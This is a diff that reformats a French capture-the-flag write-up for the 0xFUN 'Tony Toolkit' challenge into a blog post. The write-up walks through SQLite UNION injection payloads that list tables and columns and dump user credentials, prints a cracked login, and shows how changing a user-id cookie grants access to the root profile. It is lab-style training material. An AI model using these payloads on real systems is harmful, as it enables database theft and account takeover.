@@ -1,26 +1,30 @@
 ---
-tags:
-  - CTF
-date: 2026-02-13T12:08
-tasks:
-  - 
-parent files:
-  - 
+layout: writeup
 title: 'SQLi: "Tony Toolkit"'
-description: "0xFUN: Tony toolkit"
-category:
-  - challenges
+description: '0xFUN: Tony toolkit'
+excerpt: '0xFUN: Tony toolkit'
+date: 2026-02-13T12:08
+platform: ctf
+permalink: /writeups/ctf/2026/0xfun/tony-toolkit/
+year: '2026'
+event: 0xFUN
+tags:
+- CTF
+- '2026'
+next_url: /writeups/ctf/2026/0xfun/jinja/
 ---
+
+{% raw %}
 
 # Recherches
 
 On trouve une page de login.
 
-![[Pasted image 20260213121312.png]]
+<img class="content-image" src="/assets/content/ctf/2026-0xfun-tony-toolkit/Pasted%20image%2020260213121312.png" alt="SQLi: &quot;Tony Toolkit&quot;" loading="lazy">
 
 Et une page de recherche d'item.
 
-![[Pasted image 20260213121331.png]]
+<img class="content-image" src="/assets/content/ctf/2026-0xfun-tony-toolkit/Pasted%20image%2020260213121331.png" alt="SQLi: &quot;Tony Toolkit&quot;" loading="lazy">
 
 On tente une simple sqli sur la barre de recherche et on trouve une erreur, on est sur la bonne voie. On tente avec
 
@@ -41,7 +45,7 @@ a' union select 1, group_concat(tbl_name) FROM sqlite_master WHERE type='table' 
 
 On a les colonnes Products, Users.
 
-![[Pasted image 20260213141218.png]]
+<img class="content-image" src="/assets/content/ctf/2026-0xfun-tony-toolkit/Pasted%20image%2020260213141218.png" alt="SQLi: &quot;Tony Toolkit&quot;" loading="lazy">
 
 On refait pareil pour le nom des colonnes.
 
@@ -51,7 +55,7 @@ a' union select 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND
 
 On a le nom des colonnes.
 
-![[Pasted image 20260213141322.png]]
+<img class="content-image" src="/assets/content/ctf/2026-0xfun-tony-toolkit/Pasted%20image%2020260213141322.png" alt="SQLi: &quot;Tony Toolkit&quot;" loading="lazy">
 
 Et enfin avec ça on trouve l'utilisateur
 
@@ -61,7 +65,7 @@ a' union select Username, Password from Users;--
 
 Et enfin on a notre accès à un compte.
 
-![[Pasted image 20260213141428.png]]
+<img class="content-image" src="/assets/content/ctf/2026-0xfun-tony-toolkit/Pasted%20image%2020260213141428.png" alt="SQLi: &quot;Tony Toolkit&quot;" loading="lazy">
 
 On a les identifiants suivants:
 
@@ -74,9 +78,10 @@ Jerry:1qaz2wsx
 
 Enfin une fois sur le profil on change le cookie de id utilisateur de 2 vers 1 et on trouve le profil de l'utilisateur root: `0xfun{T0ny'5_T00ly4rd._1_H0p3_Y0u_H4d_Fun_SQL1ng,_H45H_Cr4ck1ng,_4nd_W1th_C00k13_M4n1pu74t10n}`
 
-![[Pasted image 20260213142339.png]]
+<img class="content-image" src="/assets/content/ctf/2026-0xfun-tony-toolkit/Pasted%20image%2020260213142339.png" alt="SQLi: &quot;Tony Toolkit&quot;" loading="lazy">
 
 
 # Exploit
 
 # Documentation
+{% endraw %}
